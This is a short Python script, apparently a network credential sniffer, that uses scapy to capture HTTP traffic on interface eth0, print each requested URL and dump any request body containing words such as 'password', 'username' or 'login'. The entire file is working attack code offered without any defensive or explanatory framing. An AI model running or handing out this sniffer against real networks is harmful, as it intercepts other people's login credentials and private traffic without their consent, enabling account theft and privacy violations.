from scapy.all import *
from scapy_http import http


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        if packet.haslayer(Raw):
            load = packet[Raw].load
            for i in keywords:
                if i in str(load):
                    print(load)
                    break


keywords = ["password", "user", "username", "login", "pass", "User", "Password"]
sniff(iface="eth0", store=False, prn=process_packet)